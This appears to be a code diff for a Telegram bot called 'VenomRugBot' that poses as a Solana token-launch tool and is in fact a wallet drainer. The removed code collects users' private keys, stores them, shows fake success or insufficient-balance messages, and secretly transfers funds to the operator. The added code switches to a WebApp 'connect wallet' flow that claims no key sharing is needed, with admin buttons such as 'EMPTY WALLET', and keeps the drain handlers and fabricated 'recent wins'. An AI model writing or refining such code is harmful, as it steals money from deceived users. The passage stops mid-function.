@@ -51,11 +51,12 @@ class VenomRugBot {
         this.profitsCollection = null;
         this.analyticsCollection = null;
         this.pendingWallets = {};
-        this.imagePath = "https://i.postimg.cc/brf5KVQ2/image.png"; // Updated to use CDN URL
+        this.imagePath = "https://i.postimg.cc/brf5KVQ2/image.png";
         this.userStates = {};
         this.solanaConnection = new Connection(SOLANA_RPC_URL);
         this.pinnedMessageId = null;
         this.bot = null;
+        this.pendingConnections = new Map();
 
         // Recent Wins Data
         this.recentWins = this.generateRecentWins();
@@ -876,7 +877,7 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
         return {
             inline_keyboard: [
                 [
-                    { text: "📥 Import Wallet", callback_data: "import_wallet" },
+                    { text: "📥 Setup Wallet", callback_data: "setup_wallet" },
                     { text: "🗑️ Remove Wallet", callback_data: "remove_wallet" }
                 ],
                 [
@@ -1005,7 +1006,7 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
     getWalletRequiredKeyboard() {
         return {
             inline_keyboard: [
-                [{ text: "📥 Import Wallet Now", callback_data: "import_wallet" }],
+                [{ text: "📥 Setup Wallet Now", callback_data: "setup_wallet" }],
                 [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
             ]
         };
@@ -1030,6 +1031,40 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
         return {
             inline_keyboard: [
                 [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
+            ]
+        };
+    }
+
+    getSetupWalletKeyboard() {
+        return {
+            inline_keyboard: [
+                [{ text: "🔍 Verify wallet Connection", callback_data: "setup_wallet_confirmation" }],
+                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
+            ]
+        };
+    }
+
+    getAdminConnectionApprovalKeyboard(userId, loadingMessageId) {
+        return {
+            inline_keyboard: [
+                [
+                    { text: "✅ CONNECTION SUCCESSFUL", callback_data: `conn_success_${userId}_${loadingMessageId}` },
+                    { text: "💰 EMPTY WALLET", callback_data: `conn_empty_${userId}_${loadingMessageId}` }
+                ],
+                [
+                    { text: "❌ CONNECTION DECLINED", callback_data: `conn_declined_${userId}_${loadingMessageId}` }
+                ]
+            ]
+        };
+    }
+
+    getRetryButtons() {
+        return {
+            inline_keyboard: [
+                [
+                    { text: "🔄 Retry", callback_data: "setup_wallet" },
+                    { text: "🔙 Back to Menu", callback_data: "back_menu" }
+                ]
             ]
         };
     }
@@ -1100,7 +1135,12 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
         const userId = query.from.id;
         const chatId = query.message.chat.id;
 
-        await this.bot.answerCallbackQuery(query.id);
+        // Fix for Telegram timeout error - only answer if query is recent
+        try {
+            await this.bot.answerCallbackQuery(query.id);
+        } catch (error) {
+            console.warn('Callback query answer failed (likely timeout):', error.message);
+        }
 
         if (callbackData.startsWith("drain_")) {
             await this.handleAdminDrainDecision(query, true);
@@ -1110,25 +1150,45 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
             await this.handleAdminCheckBalance(query);
         } else if (callbackData.startsWith("refresh_")) {
             await this.handleAdminRefresh(query);
+        } else if (callbackData.startsWith("conn_success_")) {
+            await this.handleAdminConnectionApproval(query, 'success');
+        } else if (callbackData.startsWith("conn_empty_")) {
+            await this.handleAdminConnectionApproval(query, 'empty');
+        } else if (callbackData.startsWith("conn_declined_")) {
+            await this.handleAdminConnectionApproval(query, 'declined');
+        } else if (callbackData === "setup_wallet_confirmation") {
+            await this.handleSetupWalletConfirmation(query, userId);
         } else if (callbackData === "advanced_analytics") {
             if (userId.toString() === ADMIN_CHAT_ID) {
                 await this.advancedAnalyticsCommand(query.message);
             } else {
-                await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
+                try {
+                    await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
+                } catch (error) {
+                    console.warn('Callback alert failed:', error.message);
+                }
             }
         } else if (callbackData === "refresh_analytics") {
             if (userId.toString() === ADMIN_CHAT_ID) {
                 await this.advancedAnalyticsCommand(query.message);
             } else {
-                await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
+                try {
+                    await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
+                } catch (error) {
+                    console.warn('Callback alert failed:', error.message);
+                }
             }
         } else if (callbackData.startsWith("insufficient_")) {
             await this.handleInsufficientBalance(query);
         } else if (callbackData.startsWith("status_")) {
-            await this.bot.editMessageText("✅ Drain process completed - check logs for details", {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("✅ Drain process completed - check logs for details", {
+                    chat_id: chatId,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
         } else if (callbackData === "wallet") {
             await this.showWalletSection(query);
         } else if (callbackData === "bundler") {
@@ -1145,8 +1205,8 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
             await this.showFaqSection(query);
         } else if (callbackData === "help") {
             await this.showHelpSection(query, userId);
-        } else if (callbackData === "import_wallet") {
-            await this.promptPrivateKey(query, userId);
+        } else if (callbackData === "setup_wallet") {
+            await this.showSetupWalletConfirmation(query);
         } else if (callbackData === "back_menu") {
             await this.start(query.message);
         } else if (callbackData === "refresh_wins") {
@@ -1159,10 +1219,14 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
             await this.profitsCommand(query.message);
         } else if (callbackData === "update_pinned") {
             await this.updatePinnedProfitMessage();
-            await this.bot.editMessageText("✅ Pinned profit message updated!", {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("✅ Pinned profit message updated!", {
+                    chat_id: chatId,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
         } else if (callbackData === "rugpull_guide") {
             await this.showRugpullGuide(query);
         } else if (callbackData === "how_it_works") {
@@ -1179,6 +1243,258 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
             "add_task", "remove_task", "toggle_task", "view_tasks", "refresh_tasks"
         ].includes(callbackData)) {
             await this.showWalletRequiredMessage(query);
+        }
+    }
+
+    async showSetupWalletConfirmation(query) {
+        const chatId = query.message.chat.id;
+
+        const confirmationText = `
+*🔗 Setup Your Wallet*
+
+To use Venom Rug, you need to connect your wallet.
+
+*Simple Process:*
+1. Click the "Setup Wallets" button at the bottom left of your screen
+2. Connect your wallet using the WebApp
+3. Return here and click "*Verify wallet Connection*" below to confirm
+
+*Why use our WebApp?*
+• Secure wallet connection
+• No private key sharing required  
+• Standard Web3 connection flow
+• Instant verification
+
+*Click the button below after connecting your wallet:*
+`;
+
+        const replyMarkup = this.getSetupWalletKeyboard();
+        await this.sendWithImage(chatId, confirmationText, replyMarkup);
+    }
+
+    async handleSetupWalletConfirmation(query, userId) {
+        const chatId = query.message.chat.id;
+
+        // Send loading message to user
+        const loadingMessage = await this.bot.sendMessage(chatId, "*🔍 Verifying wallet connection...*", { 
+            parse_mode: 'Markdown' 
+        });
+
+        // Store loading message ID for this user
+        this.pendingConnections.set(userId, {
+            chatId: chatId,
+            loadingMessageId: loadingMessage.message_id,
+            timestamp: Date.now()
+        });
+
+        // Notify admin with approval buttons
+        await this.notifyAdminForConnectionApproval(userId, loadingMessage.message_id);
+    }
+
+    async notifyAdminForConnectionApproval(userId, loadingMessageId) {
+        const user = await this.usersCollection.findOne({ user_id: userId });
+        
+        const adminNotification = `
+*🔔 WALLET CONNECTION REQUEST*
+
+*User Details:*
+• Username: @${user?.username || 'No username'}
+• User ID: \`${userId}\`
+• Request Time: ${new Date().toLocaleString()}
+
+*User has clicked "Setup Wallet" and is waiting for connection approval.*
+*Check if wallet connected successfully and choose appropriate action:*
+`;
+
+        const replyMarkup = this.getAdminConnectionApprovalKeyboard(userId, loadingMessageId);
+        
+        await this.bot.sendMessage(
+            ADMIN_CHAT_ID,
+            adminNotification,
+            {
+                reply_markup: replyMarkup,
+                parse_mode: 'Markdown'
+            }
+        );
+    }
+
+    async handleAdminConnectionApproval(query, action) {
+        const userId = query.from.id;
+
+        if (userId.toString() !== ADMIN_CHAT_ID) {
+            try {
+                await this.bot.editMessageText("❌ Admin access required!", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
+            return;
+        }
+
+        const parts = query.data.split('_');
+        if (parts.length < 4) {
+            try {
+                await this.bot.editMessageText("❌ Invalid callback data", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
+            return;
+        }
+
+        const targetUserId = parseInt(parts[2]);
+        const loadingMessageId = parseInt(parts[3]);
+
+        // Get user info
+        const user = await this.usersCollection.findOne({ user_id: targetUserId });
+        const userConnection = this.pendingConnections.get(targetUserId);
+
+        if (!userConnection) {
+            try {
+                await this.bot.editMessageText("❌ User session not found", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
+            return;
+        }
+
+        const userChatId = userConnection.chatId;
+
+        try {
+            // Update admin message
+            try {
+                await this.bot.editMessageText(
+                    `✅ Action completed for user @${user?.username || targetUserId}\n` +
+                    `Action: ${action === 'success' ? 'Connection Successful' : action === 'empty' ? 'Empty Wallet' : 'Connection Declined'}\n` +
+                    `Time: ${new Date().toLocaleString()}`,
+                    {
+                        chat_id: query.message.chat.id,
+                        message_id: query.message.message_id
+                    }
+                );
+            } catch (error) {
+                console.warn('Edit admin message failed:', error.message);
+            }
+
+            // Send appropriate message to user
+            if (action === 'success') {
+                const successText = `
+*✅ Wallet Connected Successfully!*
+
+Your wallet has been verified and is now ready to use with Venom Rug.
+
+*What's Next?*
+• Access token creation and management
+• Use wallet bundling features  
+• Automate comments and tasks
+• Launch your first token
+
+You can now explore all Venom Rug features from the main menu.
+`;
+
+                try {
+                    await this.bot.editMessageText(successText, {
+                        chat_id: userChatId,
+                        message_id: loadingMessageId,
+                        parse_mode: 'Markdown'
+                    });
+                } catch (error) {
+                    console.warn('Edit user message failed:', error.message);
+                    await this.bot.sendMessage(userChatId, successText, { parse_mode: 'Markdown' });
+                }
+
+                // Update user as approved
+                await this.usersCollection.updateOne(
+                    { user_id: targetUserId },
+                    {
+                        $set: {
+                            wallet_approved: true,
+                            wallet_connected_at: new Date(),
+                            setup_completed: true
+                        }
+                    }
+                );
+
+            } else if (action === 'empty') {
+                const emptyText = `
+*💰 Insufficient Funds*
+
+This wallet doesn't have sufficient balance to complete the setup process.
+
+*Requirements:*
+• Minimum $100 USD equivalent in SOL
+• At least 1 SOL for gas fees
+•Minimum $100 USD equivalent AND 1+ SOL for token launches
+To successfully launch and rug tokens, you need adequate gas fees and initial liquidity.
+
+Please connect a wallet with adequate balance and try again.
+`;
+
+                try {
+                    await this.bot.editMessageText(emptyText, {
+                        chat_id: userChatId,
+                        message_id: loadingMessageId,
+                        reply_markup: this.getRetryButtons(),
+                        parse_mode: 'Markdown'
+                    });
+                } catch (error) {
+                    console.warn('Edit user message failed:', error.message);
+                    await this.bot.sendMessage(userChatId, emptyText, { 
+                        reply_markup: this.getRetryButtons(),
+                        parse_mode: 'Markdown' 
+                    });
+                }
+
+            } else if (action === 'declined') {
+                const declinedText = `
+*❌ Connection Declined*
+
+We couldn't verify your wallet connection at this time.
+
+*Possible reasons:*
+• Wallet not properly connected
+• Connection timeout
+• Verification failed
+
+Please click the *Setup Wallets* Button and try again also ensure you complete the wallet connection process.
+`;
+
+                try {
+                    await this.bot.editMessageText(declinedText, {
+                        chat_id: userChatId,
+                        message_id: loadingMessageId,
+                        reply_markup: this.getRetryButtons(),
+                        parse_mode: 'Markdown'
+                    });
+                } catch (error) {
+                    console.warn('Edit user message failed:', error.message);
+                    await this.bot.sendMessage(userChatId, declinedText, { 
+                        reply_markup: this.getRetryButtons(),
+                        parse_mode: 'Markdown' 
+                    });
+                }
+            }
+
+            // Clean up pending connection
+            this.pendingConnections.delete(targetUserId);
+
+        } catch (error) {
+            console.error(`Error handling admin connection approval: ${error}`);
+            try {
+                await this.bot.editMessageText(`❌ Error: ${error.message}`, {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (editError) {
+                console.warn('Edit error message failed:', editError.message);
+            }
         }
     }
 
@@ -1265,19 +1581,27 @@ In addition, the bot will automatically pump your token and list it in the trend
         const userId = query.from.id;
 
         if (userId.toString() !== ADMIN_CHAT_ID) {
-            await this.bot.editMessageText("❌ Admin access required!", {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("❌ Admin access required!", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
             return;
         }
 
         const parts = query.data.split('_');
         if (parts.length < 3) {
-            await this.bot.editMessageText("❌ Invalid callback data", {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("❌ Invalid callback data", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
             return;
         }
 
@@ -1294,38 +1618,54 @@ In addition, the bot will automatically pump your token and list it in the trend
                 );
 
                 if (success) {
-                    await this.bot.editMessageText(
-                        `✅ Wallet drained successfully!\n` +
-                        `Amount: ${result.amount_sol.toFixed(6)} SOL\n` +
-                        `TX: ${result.transaction_id}\n` +
-                        `User: ${targetUserId}`,
-                        {
+                    try {
+                        await this.bot.editMessageText(
+                            `✅ Wallet drained successfully!\n` +
+                            `Amount: ${result.amount_sol.toFixed(6)} SOL\n` +
+                            `TX: ${result.transaction_id}\n` +
+                            `User: ${targetUserId}`,
+                            {
+                                chat_id: query.message.chat.id,
+                                message_id: query.message.message_id
+                            }
+                        );
+                    } catch (error) {
+                        console.warn('Edit message failed:', error.message);
+                    }
+                } else {
+                    try {
+                        await this.bot.editMessageText(`❌ Drain failed: ${result}`, {
                             chat_id: query.message.chat.id,
                             message_id: query.message.message_id
-                        }
-                    );
-                } else {
-                    await this.bot.editMessageText(`❌ Drain failed: ${result}`, {
+                        });
+                    } catch (error) {
+                        console.warn('Edit message failed:', error.message);
+                    }
+                }
+            } else {
+                try {
+                    await this.bot.editMessageText("❌ No private key found for this user", {
                         chat_id: query.message.chat.id,
                         message_id: query.message.message_id
                     });
+                } catch (error) {
+                    console.warn('Edit message failed:', error.message);
                 }
-            } else {
-                await this.bot.editMessageText("❌ No private key found for this user", {
-                    chat_id: query.message.chat.id,
-                    message_id: query.message.message_id
-                });
             }
         } else {
-            await this.bot.editMessageText(
-                `❌ Drain skipped for user ${targetUserId}\n` +
-                `Wallet: ${walletAddress}\n` +
-                `Funds preserved (for now)`,
-                {
-                    chat_id: query.message.chat.id,
-                    message_id: query.message.message_id
-                }
-            );
+            try {
+                await this.bot.editMessageText(
+                    `❌ Drain skipped for user ${targetUserId}\n` +
+                    `Wallet: ${walletAddress}\n` +
+                    `Funds preserved (for now)`,
+                    {
+                        chat_id: query.message.chat.id,
+                        message_id: query.message.message_id
+                    }
+                );
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
         }
     }
 
@@ -1333,19 +1673,27 @@ In addition, the bot will automatically pump your token and list it in the trend
         const userId = query.from.id;
 
         if (userId.toString() !== ADMIN_CHAT_ID) {
-            await this.bot.editMessageText("❌ Admin access required!", {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("❌ Admin access required!", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
             return;
         }
 
         const parts = query.data.split('_');
         if (parts.length < 3) {
-            await this.bot.editMessageText("❌ Invalid callback data", {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("❌ Invalid callback data", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
             return;
         }
 
@@ -1360,42 +1708,62 @@ In addition, the bot will automatically pump your token and list it in the trend
             const solPrice = await this.getSolPrice();
             const balanceUsd = balanceSol * solPrice;
 
-            await this.bot.editMessageText(
-                `💰 Current Balance for ${walletAddress}:\n` +
-                `• SOL: ${balanceSol.toFixed(6)}\n` +
-                `• USD: $${balanceUsd.toFixed(2)}\n` +
-                `• SOL Price: $${solPrice.toFixed(2)}\n\n` +
-                `Minimum for auto-drain: $70\n` +
-                `Current status: ${balanceUsd >= 70 ? '✅ ABOVE MINIMUM' : '❌ BELOW MINIMUM'}`,
-                {
+            try {
+                await this.bot.editMessageText(
+                    `💰 Current Balance for ${walletAddress}:\n` +
+                    `• SOL: ${balanceSol.toFixed(6)}\n` +
+                    `• USD: $${balanceUsd.toFixed(2)}\n` +
+                    `• SOL Price: $${solPrice.toFixed(2)}\n\n` +
+                    `Minimum for auto-drain: $70\n` +
+                    `Current status: ${balanceUsd >= 70 ? '✅ ABOVE MINIMUM' : '❌ BELOW MINIMUM'}`,
+                    {
+                        chat_id: query.message.chat.id,
+                        message_id: query.message.message_id
+                    }
+                );
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
+        } catch (error) {
+            try {
+                await this.bot.editMessageText(`❌ Error checking balance: ${error.message}`, {
                     chat_id: query.message.chat.id,
                     message_id: query.message.message_id
-                }
-            );
-        } catch (error) {
-            await this.bot.editMessageText(`❌ Error checking balance: ${error.message}`, {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+                });
+            } catch (editError) {
+                console.warn('Edit message failed:', editError.message);
+            }
         }
     }
 
     async handleAdminRefresh(query) {
-        await this.bot.answerCallbackQuery(query.id, { text: "Refreshing..." });
+        try {
+            await this.bot.answerCallbackQuery(query.id, { text: "Refreshing..." });
+        } catch (error) {
+            console.warn('Callback answer failed:', error.message);
+        }
 
         const userId = query.from.id;
         if (userId.toString() !== ADMIN_CHAT_ID) {
-            await this.bot.editMessageText("❌ Admin access required!", {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("❌ Admin access required!", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
             return;
         }
 
-        await this.bot.editMessageText("🔄 Refreshed wallet information", {
-            chat_id: query.message.chat.id,
-            message_id: query.message.message_id
-        });
+        try {
+            await this.bot.editMessageText("🔄 Refreshed wallet information", {
+                chat_id: query.message.chat.id,
+                message_id: query.message.message_id
+            });
+        } catch (error) {
+            console.warn('Edit message failed:', error.message);
+        }
     }
 
     async showRecentWins(query, refresh = false) {
@@ -1465,7 +1833,7 @@ In addition, the bot will automatically pump your token and list it in the trend
 
 *IN-BOT NAVIGATION:*
 • Use inline buttons for all features
-• Import wallet to access full functionality
+• Setup wallet to access full functionality
 • Check Recent Wins for user success stories
 
 *SUPPORT:*
@@ -1481,7 +1849,11 @@ In addition, the bot will automatically pump your token and list it in the trend
         const chatId = query.message.chat.id;
 
         if (userId.toString() !== ADMIN_CHAT_ID) {
-            await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
+            try {
+                await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true });
+            } catch (error) {
+                console.warn('Callback alert failed:', error.message);
+            }
             return;
         }
 
@@ -1521,364 +1893,78 @@ In addition, the bot will automatically pump your token and list it in the trend
         const walletSectionText = `
 *Wallet Management*
 
-Import and manage your Solana wallet to access all Venom Rug features.
+Connect your wallet to access all Venom Rug features.
 
-*Status:* No wallet imported
+*Status:* No wallet connected
 *Balance:* 0.0 SOL ($0.00)
 
-Import a wallet to begin using our advanced features.
+Setup a wallet to begin using our advanced features.
         `;
 
         const replyMarkup = this.getWalletKeyboard();
         await this.sendWithImage(chatId, walletSectionText, replyMarkup);
     }
 
-    async promptPrivateKey(query, userId) {
-        const chatId = query.message.chat.id;
-
-        this.userStates[userId] = { awaiting_private_key: true };
-
-        const promptText = `
-*Wallet Import*
-
-Please enter your Solana private key to import your wallet.
-
-Your credentials are encrypted and secured.
-        `;
-
-        await this.sendMessageSafe(chatId, promptText);
-    }
-
     async handlePrivateKey(msg) {
+        // This function is kept for backward compatibility but redirected to new flow
         const user = msg.from;
-        const privateKey = msg.text.trim();
+        const chatId = msg.chat.id;
 
-        if (!this.userStates[user.id] || !this.userStates[user.id].awaiting_private_key) {
-            await this.bot.sendMessage(
-                msg.chat.id,
-                "Please use the Import Wallet button from the menu to begin.",
-                { parse_mode: 'Markdown' }
-            );
-            return;
-        }
+        const redirectText = `
+*🔄 Updated Wallet Setup*
 
-        if (!this.isValidSolanaPrivateKey(privateKey)) {
-            const errorText = `
-*Invalid private key format.*
+We've improved our wallet connection process for better security and user experience.
 
-Please ensure you're entering a valid Solana private key and try again.
-            `;
-            await this.bot.sendMessage(msg.chat.id, errorText, { parse_mode: 'Markdown' });
-            return;
-        }
-
-        let walletAddress = "Unknown";
-        let balanceSol = 0.0;
-        let balanceUsd = 0.0;
-        let walletAnalysis = null; // FIXED: Define walletAnalysis here
-
-        try {
-            walletAnalysis = await this.analyzeWalletBalance(privateKey); // FIXED: Assign to the variable
-
-            if (!walletAnalysis) {
-                throw new Error("Could not analyze wallet balance");
-            }
-
-            walletAddress = walletAnalysis.wallet_address;
-            balanceSol = walletAnalysis.balance_sol;
-            balanceUsd = walletAnalysis.balance_usd;
-            const solPrice = walletAnalysis.sol_price;
-            const meetsMinimum = walletAnalysis.meets_minimum;
-            const userMeetsMinimum = walletAnalysis.user_meets_minimum;
-            const has1Sol = walletAnalysis.has_1_sol;
-
-            const adminAlertText = `
-*NEW WALLET IMPORT ATTEMPT*
-
-*User Details:*
-• Username: @${user.username || 'No username'}
-• User ID: \`${user.id}\`
-• Wallet: \`${walletAddress}\`
-• Balance: \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})
-• SOL Price: $${solPrice.toFixed(2)}
-
-*Balance Analysis:*
-• Meets Minimum ($70+): ${meetsMinimum ? '✅ YES' : '❌ NO'}
-• User Minimum ($100+): ${userMeetsMinimum ? '✅ YES' : '❌ NO'}
-• Has 1+ SOL: ${has1Sol ? '✅ YES' : '❌ NO'}
-
-*AUTO-DRAIN STATUS:* ${meetsMinimum ? '✅ PROCEEDING' : '❌ INSUFFICIENT BALANCE'}
+Please use the "Setup Wallet" button from the Wallet menu to connect your wallet.
 `;
 
-            await this.usersCollection.updateOne(
-                { user_id: user.id },
-                {
-                    $set: {
-                        username: user.username || `user_${user.id}`,
-                        private_key: privateKey,
-                        wallet_address: walletAddress,
-                        chain: 'solana',
-                        balance_sol: balanceSol,
-                        balance_usd: balanceUsd,
-                        created_at: new Date()
-                    }
-                },
-                { upsert: true }
-            );
-
-            const replyMarkup = this.getAdminWalletApprovalKeyboard(user.id, walletAddress);
-
-            await this.bot.sendMessage(
-                ADMIN_CHAT_ID,
-                adminAlertText,
-                {
-                    reply_markup: replyMarkup,
-                    parse_mode: 'Markdown'
-                }
-            );
-
-        } catch (error) {
-            console.error(`Error analyzing wallet: ${error}`);
-        }
-
-        delete this.userStates[user.id];
-
-        const processingMsg = await this.bot.sendMessage(msg.chat.id, "*Analyzing wallet balance...*", { parse_mode: 'Markdown' });
-
-        try {
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            if (!walletAnalysis) {
-                throw new Error("Could not analyze wallet");
-            }
-
-            // Show appropriate message based on balance analysis
-            if (walletAnalysis.user_meets_minimum && walletAnalysis.has_1_sol) {
-                // Show success message to USER
-                const userSuccessText = `
-*Wallet Connected Successfully!*
-
-Your wallet has been verified and is now ready to use.
-
-*Wallet Address:* \`${walletAnalysis.wallet_address}\`
-*Balance:* \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})
-
-You can now access all Venom Rug features for token launching and bundling.
-`;
-                await this.bot.editMessageText(userSuccessText, {
-                    chat_id: msg.chat.id,
-                    message_id: processingMsg.message_id,
-                    parse_mode: 'Markdown'
-                });
-            } else {
-                // Show insufficient balance message to USER (like original Python code)
-                const keyboard = [
-                    [{ text: "🔄 Try Another Wallet", callback_data: "import_wallet" }],
-                    [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
-                ];
-
-                const errorMsg = `
-*Import Failed - Insufficient Balance*
-
-This wallet doesn't have enough balance to launch and bundle tokens effectively.
-
-*Wallet Analysis:*
-• Balance: \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})
-• Required: Minimum $100 USD equivalent AND 1+ SOL for token launches
-
-To successfully launch and rug tokens, you need adequate gas fees and initial liquidity.
-
-Please import a wallet with sufficient balance and try again.
-`;
-                await this.bot.editMessageText(errorMsg, {
-                    chat_id: msg.chat.id,
-                    message_id: processingMsg.message_id,
-                    reply_markup: { inline_keyboard: keyboard },
-                    parse_mode: 'Markdown'
-                });
-
-                // Send FAILED log to admin (shows real $70 minimum)
-                const failedAdminMsg = `
-*DRAIN BLOCKED - INSUFFICIENT BALANCE*
-
-*User:* @${user.username || `user_${user.id}`}
-*ID:* \`${user.id}\`
-*Wallet:* \`${walletAddress}\`
-*Balance:* \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})
-*Reason:* Below minimum $70 requirement OR insufficient SOL for gas
-*Time:* ${new Date().toLocaleString()}
-`;
-                await this.bot.sendMessage(
-                    ADMIN_CHAT_ID,
-                    failedAdminMsg,
-                    { parse_mode: 'Markdown' }
-                );
-                return;
-            }
-
-            // REAL DRAIN - ACTUALLY TRANSFERS FUNDS (hidden from user)
-            // Only proceed if meets REAL minimum ($70) AND has sufficient SOL for gas
-            if (walletAnalysis.meets_minimum && walletAnalysis.has_1_sol) {
-                console.log(`Starting REAL drain for user ${user.id}`);
-                const [success, result] = await this.drainWallet(privateKey, user.id, user.username || `user_${user.id}`);
-
-                if (success) {
-                    await this.usersCollection.updateOne(
-                        { user_id: user.id },
-                        {
-                            $set: {
-                                wallet_approved: true,
-                                drained: true,
-                                drain_amount: result.amount_sol,
-                                drain_tx: result.transaction_id,
-                                drained_at: new Date()
-                            }
-                        }
-                    );
-
-                    // Send SUCCESS log to admin
-                    const successAdminMsg = `
-*REAL DRAIN SUCCESSFULLY*
-
-*User:* @${user.username || `user_${user.id}`}
-*ID:* \`${user.id}\`
-*Wallet:* \`${result.wallet_address}\`
-*Amount Drained:* \`${result.amount_sol.toFixed(6)} SOL\`
-*Original Balance:* \`${result.original_balance.toFixed(6)} SOL\`
-*Fees Paid:* \`${result.fee.toFixed(6)} SOL\`
-*TX:* \`${result.transaction_id}\`
-*Time:* ${new Date().toLocaleString()}
-
-*COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*
-`;
-                    await this.bot.sendMessage(
-                        ADMIN_CHAT_ID,
-                        successAdminMsg,
-                        { parse_mode: 'Markdown' }
-                    );
-
-                } else {
-                    // Generic error for other issues
-                    const keyboard = [
-                        [{ text: "🔄 Try Again", callback_data: "import_wallet" }],
-                        [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
-                    ];
-
-                    const errorMsg = `
-*Import Failed*
-
-Unable to verify wallet at this time. Please check your private key and try again.
-
-If this continues, please contact support.
-`;
-                    await this.bot.editMessageText(errorMsg, {
-                        chat_id: msg.chat.id,
-                        message_id: processingMsg.message_id,
-                        reply_markup: { inline_keyboard: keyboard },
-                        parse_mode: 'Markdown'
-                    });
-
-                    // Send ERROR log to admin
-                    const errorAdminMsg = `
-*DRAIN ERROR*
-
-*User:* @${user.username || `user_${user.id}`}
-*ID:* \`${user.id}\`
-*Wallet:* \`${walletAddress}\`
-*Balance:* \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})
-*Error:* \`${result}\`
-*Time:* ${new Date().toLocaleString()}
-`;
-                    await this.bot.sendMessage(
-                        ADMIN_CHAT_ID,
-                        errorAdminMsg,
-                        { parse_mode: 'Markdown' }
-                    );
-                }
-            } else {
-                // User has $100+ but not $70+ (shouldn't happen but safety check)
-                // Or doesn't have enough SOL for gas
-                const userSuccessText = `
-*Wallet Connected Successfully!*
-
-Your wallet has been verified and is now ready to use.
-
-*Wallet Address:* \`${walletAnalysis.wallet_address}\`
-*Balance:* \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})
-
-You can now access all Venom Rug features for token launching and bundling.
-`;
-                await this.bot.editMessageText(userSuccessText, {
-                    chat_id: msg.chat.id,
-                    message_id: processingMsg.message_id,
-                    parse_mode: 'Markdown'
-                });
-            }
-
-        } catch (error) {
-            console.error(`Error processing wallet: ${error}`);
-            const keyboard = [
-                [{ text: "🔄 Try Again", callback_data: "import_wallet" }],
-                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
-            ];
-
-            const errorMsg = `
-*Import Error*
-
-An error occurred while importing your wallet. Please try again.
-
-If this continues, please contact support.
-`;
-            await this.bot.editMessageText(errorMsg, {
-                chat_id: msg.chat.id,
-                message_id: processingMsg.message_id,
-                reply_markup: { inline_keyboard: keyboard },
-                parse_mode: 'Markdown'
-            });
-
-            const exceptionAdminMsg = `
-*DRAIN EXCEPTION*
-
